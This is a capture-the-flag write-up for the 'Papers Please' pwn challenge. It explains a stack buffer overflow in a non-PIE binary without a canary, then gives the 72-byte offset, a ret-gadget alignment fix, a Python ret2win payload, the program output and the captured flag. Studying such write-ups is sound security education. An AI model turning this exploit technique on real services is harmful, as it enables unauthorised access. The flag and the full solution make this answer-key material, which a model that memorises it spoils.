# Papers Please — Pwn (Easy)

**Flag:** `H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}` · **Target:** `pwn.h7tex.com:42578`
**Files:** `checkpoint.zip` (1077085 B, sha256 `737ceea6...a209da0b`) containing `checkpoint` (ELF x86-64, 16344 B, sha256 `b04ebc61...`), `libc.so.6`, `ld-linux-x86-64.so.2`, `README.txt`.
Target environment: Ubuntu 24.04, glibc 2.39-0ubuntu8.9.

## Challenge

A border checkpoint asks for your name, echoes the name into the log, answers "Access denied ... Turn back." and drops the connection. Behind the counter the seal is already there, i.e. the grant-access function. The guard will not reach for it on anyone's behalf. Goal: make the service print the flag.

## Initial Analysis

`triage.cjs` reports:

| Property | Value | Consequence |
| --- | --- | --- |
| `ET_EXEC`, no PIE | fixed base | no leak needed, function addresses are absolute constants |
| Stack canary | absent (`__stack_chk_fail` is not among the imports) | the return address can be overwritten freely |
| NX | on | no shellcode on the stack, only reuse of code that is already there |
| Imports | `read fopen fgets printf puts setvbuf fflush fclose` | `read` is not capped by the buffer length |

The three relevant functions:

```
main        @ 0x401302   setvbuf(stdout, NULL, _IONBF, 0); call checkpoint
checkpoint  @ 0x4012a4   sub rsp,0x40 -> buffer 64 byte ở [rbp-0x40]
grant_access@ 0x401216   fopen("/flag","r"); fgets(buf,0x50); printf("ACCESS GRANTED: %s")
```

`main` never calls `grant_access`. That function is the seal from the challenge text: it opens `/flag` itself and prints the contents.

The break is in `checkpoint`:

```
4012ce: lea   rax,[rbp-0x40]     ; buffer 64 byte
4012d2: mov   edx,0x100          ; đọc 256 byte
4012df: call  read@plt           ; read(0, buf, 256)
4012fa: call  printf@plt         ; printf("Access denied, %s. Turn back.", buf)
```

`read(0, buf, 0x100)` with a `buf` of only 64 bytes and no canary: a plain stack overflow.

## Approaches Ruled Out

1. Format string through the name. The format string `"Access denied, %s. Turn back."` lives in `.rodata` and is `printf`'s fixed argument; the name typed by the user only feeds `%s`. Sending `%p`/`%n` gets printed verbatim, and neither reads nor writes the stack.
2. Shellcode on the stack. NX is on.
3. Leaking the base before attacking. `ET_EXEC`, no PIE: function addresses are absolute constants, there is nothing to leak.

## Exploit Chain

**Step 1 - offset to the return address.** The buffer sits at `[rbp-0x40]` (64 bytes), the saved rbp at `[rbp]` (8 bytes), the return address at `[rbp+8]`. Offset = 64 + 8 = 72 bytes. `read` allows sending up to 256 bytes, so there is more than enough room.

**Step 2 - stack alignment.** The ABI requires `rsp % 16 == 8` at the first instruction of a function.

- Jumping straight to `grant_access` with `leave; ret`: `leave` sets `rsp = rbp_checkpoint`, `pop rbp` pushes 8 back, `ret` pushes 8 more, leaving `rsp = rbp_main + 8`. `main` only does `push rbp` before the call, so `rbp_main % 16 == 0`. We would enter `grant_access` with `rsp % 16 == 0`, 8 bytes off the standard alignment.
- `grant_access` calls glibc 2.39's `fopen`/`fgets`/`printf`; those paths use `movaps` on the stack and take a `SIGSEGV` when the stack is misaligned.

Insert one `ret` gadget to shift `rsp` by another 8 bytes. `_fini @ 0x401334` (`endbr64; sub rsp,8; add rsp,8; ret`) is chosen: it slides the stack by exactly 8 bytes, and it opens with `endbr64` so it stays valid on a CPU with CET/IBT enabled.

**Step 3 - payload.**

```python
OFFSET      = 72
GRANT_ACCESS = 0x401216
RET_SLIDE    = 0x401334

payload = b"DANH.B23DCAT040".ljust(OFFSET, b"A") + p64(RET_SLIDE) + p64(GRANT_ACCESS)
```

88 bytes in total, below `read`'s 256 byte ceiling. No forbidden characters: `read` does not stop at `\0`, and `printf` printing up to the `\0` is just a harmless side effect.

**Step 4 - running.**

```
cd "H7CTF 2026 Quals/papers-please"
python exploit.py
```

The response received:

```
=== Sparrow Freight border checkpoint ===
State your name for the log:
Access denied, DANH.B23DCAT040AAAA...4@. Turn back.
ACCESS GRANTED: H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```

**Step 5 - Verification.** The flag is captured with the regex `H7CTF\{[^}\n]*\}` over the exact bytes read from the socket, then written straight into `flag.txt`.

## Flag
```
H7CTF{b66621cc-c85c-4042-b908-0d3dd36a71e5}
```
